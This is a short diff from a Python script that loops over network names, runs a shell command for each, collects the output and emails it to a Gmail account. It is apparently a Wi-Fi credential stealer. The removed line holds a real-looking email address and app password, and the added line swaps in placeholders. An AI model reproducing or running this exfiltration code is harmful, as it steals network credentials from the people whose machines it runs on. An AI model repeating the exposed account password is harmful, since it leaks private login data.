@@ -16,4 +16,4 @@ for network_name in network_names_list:
     currunt_result = subprocess.check_output(command, shell=True)
     result = result + currunt_result
 
-send_mail("kaliwolf2212@gmail.com", "hiwgivilyvkuohtb", result)
+send_mail("gmail", "password", result)
